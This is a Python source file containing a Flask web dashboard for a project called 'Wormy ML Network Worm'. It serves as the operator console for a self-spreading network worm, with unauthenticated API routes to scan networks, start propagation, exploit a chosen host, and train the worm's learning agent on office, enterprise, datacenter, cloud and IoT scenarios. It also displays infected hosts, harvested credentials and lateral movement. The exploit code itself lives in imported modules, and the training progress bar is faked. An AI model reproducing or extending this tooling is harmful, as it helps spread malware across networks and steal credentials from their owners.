"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Armitage-Style Dashboard
Visual network map with host icons, training panel, and real-time control
Inspired by Armitage's Metasploit GUI
"""

import json
import logging
import os
import sys
import threading
import time
from datetime import datetime
from typing import Dict, List, Optional

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.logger import logger

# ── Silence Flask/Werkzeug access logs (they pollute Rich Live TUI) ───────────
logging.getLogger("werkzeug").setLevel(logging.ERROR)
logging.getLogger("flask.app").setLevel(logging.ERROR)

try:
    from flask import Flask, jsonify, render_template_string, request

    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False


class ArmitageDashboard:
    """
    Armitage-style Dashboard

    Features:
    - Visual network map with host icons (like Armitage)
    - Color-coded hosts (green=infected, red=failed, blue=discovered)
    - Training panel with progress bars
    - Real-time propagation control
    - Host right-click context menu
    - Activity feed
    - Simple, clean interface
    """

    def __init__(self, worm_core=None, trainer=None, host: str = "0.0.0.0", port: int = 5001):
        self.worm = worm_core
        self.trainer = trainer
        self.host = host
        self.port = port
        self._thread = None

        if not FLASK_AVAILABLE:
            logger.error("Flask not available")
            return

        self.app = Flask(__name__)
        self._setup_routes()
        logger.info(f"Armitage Dashboard initialized on {host}:{port}")

    def _setup_routes(self):
        @self.app.route("/")
        def index():
            return render_template_string(self._get_html())

        @self.app.route("/api/map")
        def api_map():
            return jsonify(self._get_map_data())

        @self.app.route("/api/training")
        def api_training():
            return jsonify(self._get_training_data())

        @self.app.route("/api/start_training", methods=["POST"])
        def api_start_training():
            data = request.json or {}
            scenarios = data.get("scenarios", ["small_office", "enterprise"])
            if self.trainer:
                threading.Thread(
                    target=self.trainer.train,
                    kwargs={"scenarios": scenarios, "total_episodes": 100},
                    daemon=True,
                ).start()
            return jsonify({"status": "started", "scenarios": scenarios})

        @self.app.route("/api/start_propagation", methods=["POST"])
        def api_start_propagation():
            if self.worm and not getattr(self.worm, "running", False):
                threading.Thread(target=self.worm.propagate, daemon=True).start()
            return jsonify({"status": "propagation_started"})

        @self.app.route("/api/stop_propagation", methods=["POST"])
        def api_stop_propagation():
            if self.worm:
                self.worm.stop()
            return jsonify({"status": "stopped"})

        @self.app.route("/api/exploit_host", methods=["POST"])
        def api_exploit_host():
            data = request.json or {}
            ip = data.get("ip", "")
            if self.worm and ip:
                target = next((t for t in self.worm.scan_results if t["ip"] == ip), None)
                if target:
                    threading.Thread(
                        target=self.worm.exploit_target, args=(target,), daemon=True
                    ).start()
            return jsonify({"status": "exploiting", "target": ip})

        @self.app.route("/api/scan", methods=["POST"])
        def api_scan():
            if self.worm:
                threading.Thread(target=self.worm.scan_network, daemon=True).start()
            return jsonify({"status": "scanning"})

    def _get_map_data(self) -> Dict:
        hosts = []
        if self.worm:
            for host in self.worm.scan_results:
                ip = host["ip"]
                is_infected = ip in self.worm.infected_hosts
                is_failed = ip in self.worm.failed_targets
                status = "infected" if is_infected else ("failed" if is_failed else "discovered")

                hosts.append(
                    {
                        "id": ip,
                        "ip": ip,
                        "os": host.get("os_guess", "Unknown"),
                        "status": status,
                        "ports": host.get("open_ports", []),
                        "vuln_score": host.get("vulnerability_score", 0),
                        "services": host.get("services", {}),
                        "vulnerabilities": len(host.get("vulnerabilities", [])),
                        "exploit_chain": len(host.get("exploit_chain", [])),
                    }
                )

        if self.worm and self.worm.host_monitor:
            mapped_ips = {h["ip"] for h in hosts}
            for ip, host_state in self.worm.host_monitor.hosts.items():
                if ip not in mapped_ips:
                    hosts.append(
                        {
                            "id": ip,
                            "ip": ip,
                            "os": host_state.os_guess,
                            "status": host_state.status,
                            "ports": host_state.open_ports,
                            "vuln_score": 0,
                            "services": {},
                            "vulnerabilities": 0,
                            "exploit_chain": 0,
                        }
                    )

        edges = []
        if self.worm and self.worm.host_monitor:
            for ip, hs in self.worm.host_monitor.hosts.items():
                for lm in hs.lateral_movement_history:
                    edges.append(
                        {
                            "from": ip,
                            "to": lm.get("target", ""),
                            "technique": lm.get("technique", ""),
                            "success": lm.get("success", False),
                        }
                    )

        stats = {}
        if self.worm:
            stats = {
                "infected": len(self.worm.infected_hosts),
                "failed": len(self.worm.failed_targets),
                "discovered": len(self.worm.scan_results),
                "vulnerabilities": self.worm.stats.get("vulnerabilities_found", 0),
                "credentials": self.worm.stats.get("credentials_discovered", 0),
                "lateral": self.worm.stats.get("lateral_success", 0),
                "running": self.worm.running,
                "start_time": self.worm.start_time.isoformat() if self.worm.start_time else None,
            }

        return {"hosts": hosts, "edges": edges, "stats": stats}

    def _get_training_data(self) -> Dict:
        if not self.trainer:
            return {"available": False}

        status = self.trainer.get_training_status()
        return {
            "available": True,
            "trained": status["trained"],
            "best_reward": status.get("best_reward", 0),
            "total_episodes": status.get("total_episodes", 0),
            "scenarios": status.get("scenarios", []),
            "timestamp": status.get("timestamp", ""),
            "available_scenarios": ["small_office", "enterprise", "datacenter", "cloud", "iot"],
        }

    def _get_html(self) -> str:
        return """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wormy - Armitage Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Consolas', 'Monaco', monospace;
            background: #0d1117;
            color: #c9d1d9;
            height: 100vh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        /* Top Bar */
        .topbar {
            background: #161b22;
            border-bottom: 1px solid #30363d;
            padding: 8px 16px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            height: 48px;
        }
        .topbar h1 {
            font-size: 1.1em;
            color: #58a6ff;
        }
        .topbar .controls {
            display: flex;
            gap: 8px;
        }
        .btn {
            padding: 6px 14px;
            border: 1px solid #30363d;
            background: #21262d;
            color: #c9d1d9;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.85em;
            font-family: inherit;
            transition: all 0.2s;
        }
        .btn:hover { background: #30363d; }
        .btn-green { background: #238636; border-color: #2ea043; color: #fff; }
        .btn-green:hover { background: #2ea043; }
        .btn-red { background: #da3633; border-color: #f85149; color: #fff; }
        .btn-red:hover { background: #f85149; }
        .btn-blue { background: #1f6feb; border-color: #388bfd; color: #fff; }
        .btn-blue:hover { background: #388bfd; }

        /* Main Layout */
        .main {
            display: flex;
            flex: 1;
            overflow: hidden;
        }

        /* Left Panel - Training */
        .left-panel {
            width: 280px;
            background: #161b22;
            border-right: 1px solid #30363d;
            display: flex;
            flex-direction: column;
            overflow-y: auto;
        }
        .panel-section {
            padding: 12px;
            border-bottom: 1px solid #30363d;
        }
        .panel-section h3 {
            font-size: 0.85em;
            color: #8b949e;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 10px;
        }
        .stat-row {
            display: flex;
            justify-content: space-between;
            padding: 4px 0;
            font-size: 0.9em;
        }
        .stat-row .label { color: #8b949e; }
        .stat-row .value { color: #58a6ff; font-weight: bold; }
        .stat-row .value.green { color: #3fb950; }
        .stat-row .value.red { color: #f85149; }
        .stat-row .value.yellow { color: #d29922; }

        .scenario-list {
            display: flex;
            flex-direction: column;
            gap: 6px;
        }
        .scenario-item {
            padding: 8px 10px;
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 6px;
            cursor: pointer;
            transition: all 0.2s;
        }
        .scenario-item:hover { border-color: #58a6ff; }
        .scenario-item.selected { border-color: #58a6ff; background: #161b22; }
        .scenario-item .name { font-size: 0.9em; color: #c9d1d9; }
        .scenario-item .desc { font-size: 0.75em; color: #8b949e; margin-top: 2px; }

        .progress-bar {
            width: 100%;
            height: 8px;
            background: #21262d;
            border-radius: 4px;
            overflow: hidden;
            margin-top: 8px;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #238636, #3fb950);
            transition: width 0.5s;
        }

        /* Center - Network Map */
        .center-panel {
            flex: 1;
            position: relative;
            background: #0d1117;
            overflow: hidden;
        }
        #network-map {
            width: 100%;
            height: 100%;
        }

        /* Right Panel - Activity */
        .right-panel {
            width: 320px;
            background: #161b22;
            border-left: 1px solid #30363d;
            display: flex;
            flex-direction: column;
        }
        .activity-feed {
            flex: 1;
            overflow-y: auto;
            padding: 8px;
        }
        .activity-item {
            padding: 6px 8px;
            border-bottom: 1px solid #21262d;
            font-size: 0.8em;
        }
        .activity-item .time { color: #484f58; font-size: 0.85em; }
        .activity-item .type {
            display: inline-block;
            padding: 1px 6px;
            border-radius: 3px;
            font-size: 0.85em;
            margin: 0 4px;
        }
        .type-infected { background: #23863622; color: #3fb950; }
        .type-failed { background: #da363322; color: #f85149; }
        .type-scan { background: #1f6feb22; color: #58a6ff; }
        .type-lateral { background: #d2992222; color: #d29922; }
        .type-credential { background: #a371f722; color: #a371f7; }
        .activity-item .details { color: #c9d1d9; }

        /* Host Icon on Map */
        .host-icon {
            position: absolute;
            width: 60px;
            text-align: center;
            cursor: pointer;
            transition: transform 0.2s;
        }
        .host-icon:hover { transform: scale(1.1); }
        .host-icon .icon {
            width: 40px;
            height: 40px;
            margin: 0 auto 4px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.2em;
            border: 2px solid;
        }
        .host-infected .icon { background: #23863622; border-color: #3fb950; color: #3fb950; }
        .host-failed .icon { background: #da363322; border-color: #f85149; color: #f85149; }
        .host-discovered .icon { background: #1f6feb22; border-color: #58a6ff; color: #58a6ff; }
        .host-icon .ip {
            font-size: 0.7em;
            color: #8b949e;
            white-space: nowrap;
        }
        .host-icon .os {
            font-size: 0.6em;
            color: #484f58;
        }

        /* Connection Lines */
        .connection-line {
            position: absolute;
            height: 2px;
            transform-origin: left center;
            pointer-events: none;
        }
        .conn-success { background: #3fb950; opacity: 0.6; }
        .conn-failed { background: #f85149; opacity: 0.4; }

        /* Context Menu */
        .context-menu {
            position: absolute;
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 8px;
            padding: 4px 0;
            min-width: 180px;
            z-index: 1000;
            display: none;
            box-shadow: 0 8px 24px rgba(0,0,0,0.4);
        }
        .context-menu.show { display: block; }
        .context-menu-item {
            padding: 8px 16px;
            cursor: pointer;
            font-size: 0.85em;
            transition: background 0.1s;
        }
        .context-menu-item:hover { background: #21262d; }
        .context-menu-item.danger { color: #f85149; }

        /* Legend */
        .legend {
            position: absolute;
            bottom: 10px;
            left: 10px;
            background: #161b22ee;
            border: 1px solid #30363d;
            border-radius: 8px;
            padding: 10px;
            font-size: 0.75em;
        }
        .legend-item {
            display: flex;
            align-items: center;
            gap: 6px;
            margin: 3px 0;
        }
        .legend-dot {
            width: 10px;
            height: 10px;
            border-radius: 3px;
        }
        .dot-infected { background: #3fb950; }
        .dot-failed { background: #f85149; }
        .dot-discovered { background: #58a6ff; }

        /* Training Progress */
        .training-status {
            padding: 8px 12px;
            background: #0d1117;
            border-radius: 6px;
            margin-top: 8px;
        }
        .training-status .label { font-size: 0.8em; color: #8b949e; }
        .training-status .value { font-size: 1em; color: #3fb950; font-weight: bold; }
    </style>
</head>
<body>
    <div class="topbar">
        <h1>🐛 Wormy ML Network Worm v3.0</h1>
        <div class="controls">
            <button class="btn btn-blue" onclick="scanNetwork()">🔍 Scan</button>
            <button class="btn btn-green" onclick="startPropagation()">▶ Propagate</button>
            <button class="btn btn-red" onclick="stopPropagation()">⏹ Stop</button>
            <button class="btn" onclick="refreshMap()">🔄 Refresh</button>
        </div>
    </div>

    <div class="main">
        <!-- Left Panel: Training -->
        <div class="left-panel">
            <div class="panel-section">
                <h3>📊 Statistics</h3>
                <div class="stat-row"><span class="label">Infected</span><span class="value green" id="stat-infected">0</span></div>
                <div class="stat-row"><span class="label">Discovered</span><span class="value" id="stat-discovered">0</span></div>
                <div class="stat-row"><span class="label">Failed</span><span class="value red" id="stat-failed">0</span></div>
                <div class="stat-row"><span class="label">Vulnerabilities</span><span class="value yellow" id="stat-vulns">0</span></div>
                <div class="stat-row"><span class="label">Credentials</span><span class="value" id="stat-creds">0</span></div>
                <div class="stat-row"><span class="label">Lateral Movement</span><span class="value green" id="stat-lateral">0</span></div>
                <div class="stat-row"><span class="label">Status</span><span class="value" id="stat-status">Stopped</span></div>
            </div>

            <div class="panel-section">
                <h3>🧠 Training</h3>
                <div class="training-status">
                    <div class="label">Status</div>
                    <div class="value" id="training-status">Not Trained</div>
                    <div class="label" style="margin-top:4px;">Episodes</div>
                    <div class="value" id="training-episodes">0</div>
                    <div class="label" style="margin-top:4px;">Best Reward</div>
                    <div class="value" id="training-reward">0</div>
                </div>
                <div class="progress-bar" style="margin-top:8px;">
                    <div class="progress-fill" id="training-progress" style="width:0%"></div>
                </div>
            </div>

            <div class="panel-section">
                <h3>🎯 Training Scenarios</h3>
                <div class="scenario-list" id="scenario-list">
                    <div class="scenario-item selected" data-scenario="small_office">
                        <div class="name">Small Office</div>
                        <div class="desc">10 hosts - Basic network</div>
                    </div>
                    <div class="scenario-item selected" data-scenario="enterprise">
                        <div class="name">Enterprise</div>
                        <div class="desc">30 hosts - Multi-subnet, AD</div>
                    </div>
                    <div class="scenario-item" data-scenario="datacenter">
                        <div class="name">Datacenter</div>
                        <div class="desc">50 hosts - Servers, containers</div>
                    </div>
                    <div class="scenario-item" data-scenario="cloud">
                        <div class="name">Cloud</div>
                        <div class="desc">40 hosts - Microservices</div>
                    </div>
                    <div class="scenario-item" data-scenario="iot">
                        <div class="name">IoT/OT</div>
                        <div class="desc">25 hosts - Industrial IoT</div>
                    </div>
                </div>
                <button class="btn btn-green" style="width:100%;margin-top:10px;" onclick="startTraining()">🧠 Start Training</button>
            </div>
        </div>

        <!-- Center: Network Map -->
        <div class="center-panel" id="map-container">
            <canvas id="network-map"></canvas>
            <div class="legend">
                <div class="legend-item"><div class="legend-dot dot-infected"></div> Infected</div>
                <div class="legend-item"><div class="legend-dot dot-discovered"></div> Discovered</div>
                <div class="legend-item"><div class="legend-dot dot-failed"></div> Failed</div>
            </div>
        </div>

        <!-- Right Panel: Activity -->
        <div class="right-panel">
            <div class="panel-section" style="border-bottom:none;">
                <h3>📋 Activity Feed</h3>
            </div>
            <div class="activity-feed" id="activity-feed">
                <div style="color:#484f58;padding:20px;text-align:center;">Waiting for activity...</div>
            </div>
        </div>
    </div>

    <!-- Context Menu -->
    <div class="context-menu" id="context-menu">
        <div class="context-menu-item" onclick="exploitHost()">🎯 Exploit</div>
        <div class="context-menu-item" onclick="scanHost()">🔍 Scan</div>
        <div class="context-menu-item" onclick="viewVulns()">⚠️ Vulnerabilities</div>
        <div class="context-menu-item" onclick="viewCreds()">🔑 Credentials</div>
        <div class="context-menu-item danger" onclick="removeHost()">🗑️ Remove</div>
    </div>

    <script>
        let hosts = [];
        let edges = [];
        let selectedHost = null;
        let contextMenuHost = null;

        const canvas = document.getElementById('network-map');
        const ctx = canvas.getContext('2d');

        function resizeCanvas() {
            const container = document.getElementById('map-container');
            canvas.width = container.clientWidth;
            canvas.height = container.clientHeight;
            drawMap();
        }
        window.addEventListener('resize', resizeCanvas);

        function refreshMap() {
            fetch('/api/map')
                .then(r => r.json())
                .then(data => {
                    hosts = data.hosts || [];
                    edges = data.edges || [];
                    updateStats(data.stats || {});
                    drawMap();
                });
            fetch('/api/training')
                .then(r => r.json())
                .then(data => {
                    updateTraining(data);
                });
        }

        function updateTraining(data) {
            if (!data.available) return;
            const statusEl = document.getElementById('training-status');
            statusEl.textContent = data.trained ? 'Trained' : 'Training...';
            statusEl.style.color = data.trained ? '#3fb950' : '#d29922';
            
            document.getElementById('training-episodes').textContent = data.total_episodes || 0;
            document.getElementById('training-reward').textContent = (data.best_reward || 0).toFixed(2);
            
            // Fake progress if training is active but not finished (since we don't have real progress)
            const progressEl = document.getElementById('training-progress');
            if (data.trained) {
                progressEl.style.width = '100%';
            } else if (statusEl.textContent === 'Training...') {
                const current = parseFloat(progressEl.style.width) || 0;
                progressEl.style.width = Math.min(95, current + 5) + '%';
            }
        }

        function updateStats(stats) {
            document.getElementById('stat-infected').textContent = stats.infected || 0;
            document.getElementById('stat-discovered').textContent = stats.discovered || 0;
            document.getElementById('stat-failed').textContent = stats.failed || 0;
            document.getElementById('stat-vulns').textContent = stats.vulnerabilities || 0;
            document.getElementById('stat-creds').textContent = stats.credentials || 0;
            document.getElementById('stat-lateral').textContent = stats.lateral || 0;
            document.getElementById('stat-status').textContent = stats.running ? 'Running' : 'Stopped';
            document.getElementById('stat-status').style.color = stats.running ? '#3fb950' : '#f85149';
        }

        function drawMap() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);

            // Draw grid
            ctx.strokeStyle = '#21262d';
            ctx.lineWidth = 0.5;
            for (let x = 0; x < canvas.width; x += 40) {
                ctx.beginPath(); ctx.moveTo(x, 0); ctx.lineTo(x, canvas.height); ctx.stroke();
            }
            for (let y = 0; y < canvas.height; y += 40) {
                ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(canvas.width, y); ctx.stroke();
            }

            // Position hosts in a grid
            const cols = Math.ceil(Math.sqrt(hosts.length));
            const spacingX = Math.min(120, (canvas.width - 100) / cols);
            const spacingY = Math.min(100, (canvas.height - 100) / Math.ceil(hosts.length / cols));
            const startX = (canvas.width - (cols - 1) * spacingX) / 2;
            const startY = 60;

            hosts.forEach((host, i) => {
                const col = i % cols;
                const row = Math.floor(i / cols);
                host.x = startX + col * spacingX;
                host.y = startY + row * spacingY;
            });

            // Draw edges
            edges.forEach(edge => {
                const from = hosts.find(h => h.id === edge.from);
                const to = hosts.find(h => h.id === edge.to);
                if (from && to) {
                    ctx.beginPath();
                    ctx.moveTo(from.x + 20, from.y + 20);
                    ctx.lineTo(to.x + 20, to.y + 20);
                    ctx.strokeStyle = edge.success ? '#3fb95066' : '#f8514944';
                    ctx.lineWidth = 2;
                    ctx.stroke();

                    // Arrow
                    const angle = Math.atan2(to.y - from.y, to.x - from.x);
                    ctx.beginPath();
                    ctx.moveTo(to.x + 20, to.y + 20);
                    ctx.lineTo(to.x + 20 - 8 * Math.cos(angle - 0.3), to.y + 20 - 8 * Math.sin(angle - 0.3));
                    ctx.moveTo(to.x + 20, to.y + 20);
                    ctx.lineTo(to.x + 20 - 8 * Math.cos(angle + 0.3), to.y + 20 - 8 * Math.sin(angle + 0.3));
                    ctx.stroke();
                }
            });

            // Draw hosts
            hosts.forEach(host => {
                const color = host.status === 'infected' ? '#3fb950' :
                              host.status === 'failed' ? '#f85149' : '#58a6ff';
                const bg = host.status === 'infected' ? '#23863622' :
                           host.status === 'failed' ? '#da363322' : '#1f6feb22';

                // Icon box
                ctx.fillStyle = bg;
                ctx.strokeStyle = color;
                ctx.lineWidth = 2;
                ctx.beginPath();
                ctx.roundRect(host.x, host.y, 40, 40, 8);
                ctx.fill();
                ctx.stroke();

                // Icon
                ctx.fillStyle = color;
                ctx.font = '16px Consolas';
                ctx.textAlign = 'center';
                const icon = host.status === 'infected' ? '✓' : host.status === 'failed' ? '✗' : '?';
                ctx.fillText(icon, host.x + 20, host.y + 26);

                // IP
                ctx.fillStyle = '#8b949e';
                ctx.font = '10px Consolas';
                ctx.fillText(host.ip, host.x + 20, host.y + 55);

                // OS
                ctx.fillStyle = '#484f58';
                ctx.font = '8px Consolas';
                ctx.fillText(host.os.substring(0, 12), host.x + 20, host.y + 66);
            });
        }

        // Context menu
        canvas.addEventListener('contextmenu', (e) => {
            e.preventDefault();
            const rect = canvas.getBoundingClientRect();
            const mx = e.clientX - rect.left;
            const my = e.clientY - rect.top;

            contextMenuHost = hosts.find(h => mx >= h.x && mx <= h.x + 40 && my >= h.y && my <= h.y + 40);
            const menu = document.getElementById('context-menu');
            if (contextMenuHost) {
                menu.style.left = e.clientX + 'px';
                menu.style.top = e.clientY + 'px';
                menu.classList.add('show');
            } else {
                menu.classList.remove('show');
            }
        });

        canvas.addEventListener('click', () => {
            document.getElementById('context-menu').classList.remove('show');
        });

        function exploitHost() {
            if (!contextMenuHost) return;
            fetch('/api/exploit_host', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ip: contextMenuHost.ip})
            });
            addActivity('exploit', contextMenuHost.ip, `Exploiting ${contextMenuHost.ip}`);
            document.getElementById('context-menu').classList.remove('show');
        }

        function scanHost() {
            if (!contextMenuHost) return;
            addActivity('scan', contextMenuHost.ip, `Scanning ${contextMenuHost.ip}`);
            document.getElementById('context-menu').classList.remove('show');
        }

        function viewVulns() {
            if (!contextMenuHost) return;
            alert(`Vulnerabilities for ${contextMenuHost.ip}:\\nScore: ${contextMenuHost.vuln_score}/100\\nCount: ${contextMenuHost.vulnerabilities}`);
            document.getElementById('context-menu').classList.remove('show');
        }

        function viewCreds() {
            alert('Credentials panel coming soon');
            document.getElementById('context-menu').classList.remove('show');
        }

        function removeHost() {
            document.getElementById('context-menu').classList.remove('show');
        }

        function addActivity(type, host, details) {
            const feed = document.getElementById('activity-feed');
            const time = new Date().toLocaleTimeString();
            const typeClass = `type-${type}`;
            const item = document.createElement('div');
            item.className = 'activity-item';
            item.innerHTML = `<span class="time">${time}</span><span class="type ${typeClass}">${type.toUpperCase()}</span><span class="details">${details}</span>`;
            feed.insertBefore(item, feed.firstChild);
            if (feed.children.length > 50) feed.removeChild(feed.lastChild);
        }

        function startTraining() {
            const selected = Array.from(document.querySelectorAll('.scenario-item.selected'))
                .map(el => el.dataset.scenario);
            fetch('/api/start_training', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({scenarios: selected})
            });
            addActivity('training', 'system', `Starting training: ${selected.join(', ')}`);
        }

        function startPropagation() {
            fetch('/api/start_propagation', {method: 'POST'});
            addActivity('scan', 'system', 'Starting propagation');
        }

        function stopPropagation() {
            fetch('/api/stop_propagation', {method: 'POST'});
            addActivity('scan', 'system', 'Stopping propagation');
        }

        function scanNetwork() {
            fetch('/api/scan', {method: 'POST'});
            addActivity('scan', 'system', 'Network scan started');
        }

        // Scenario selection
        document.querySelectorAll('.scenario-item').forEach(item => {
            item.addEventListener('click', () => item.classList.toggle('selected'));
        });

        // Auto-refresh
        setInterval(refreshMap, 3000);
        window.onload = () => {
            resizeCanvas();
            refreshMap();
        };
    </script>
</body>
</html>
"""

    def run(self, debug: bool = False):
        if not FLASK_AVAILABLE:
            return
        import logging as _log

        _log.getLogger("werkzeug").setLevel(_log.ERROR)
        logger.info(f"Starting Armitage Dashboard on {self.host}:{self.port}")
        self.app.run(
            host=self.host,
            port=self.port,
            debug=False,  # never debug — it spawns a second process
            threaded=True,
            use_reloader=False,  # prevents double-start on Windows
        )

    def run_background(self):
        if not FLASK_AVAILABLE:
            return None
        self._thread = threading.Thread(target=self.run, daemon=True)
        self._thread.start()
        logger.info(f"Armitage Dashboard running at http://{self.host}:{self.port}")
        return self._thread
